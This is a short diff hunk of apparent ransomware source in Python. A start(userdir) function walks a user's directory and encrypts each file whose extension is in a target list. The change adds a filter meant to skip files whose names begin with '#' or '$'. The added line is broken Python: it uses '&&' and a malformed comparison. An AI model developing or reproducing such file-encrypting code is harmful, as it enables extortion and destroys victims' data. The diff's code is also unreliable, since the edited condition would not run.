@@ -9,7 +9,7 @@ def start(userdir):
         for name in files:
             target = os.path.join(root,name)
             ext = os.path.splitext(name)
-            if ext[1] in exts:
+            if ext[1] in exts && ext[0][0] != "#","$":
                 encrypt(target)
 
 
